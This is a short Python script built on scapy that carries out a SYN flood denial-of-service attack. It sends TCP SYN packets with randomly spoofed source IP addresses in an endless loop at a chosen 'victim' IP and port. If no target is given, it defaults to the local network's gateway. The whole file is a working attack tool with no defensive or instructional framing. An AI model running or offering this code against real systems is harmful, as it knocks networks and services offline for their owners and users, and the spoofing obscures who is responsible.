#!/usr/bin/env python

import sys
import os
from scapy.all import *
import netifaces
import time

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def get_gateway_ip():
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        return default_gateway
    except (KeyError, IndexError):
        return None

def syn_flood(dest_ip, dest_port):
    s_addr = RandIP()
    packet = IP(src= s_addr, dst=dest_ip) / TCP(sport=RandShort(), dport=dest_port, seq=1505066, flags="S")
    send(packet, verbose=0)


def main():
    check_root()

    victim_ip = sys.argv[1] if len(sys.argv) > 1 else get_gateway_ip()
    victim_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

    print("Start SYN flood")
    print("Target IP:", victim_ip)
    print("Target PORT:", victim_port)
    try:
        print("To stop press CTRL+C")
        while True:
            syn_flood(victim_ip, victim_port)
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\nSYN flood stoped")

if __name__ == "__main__":
    main()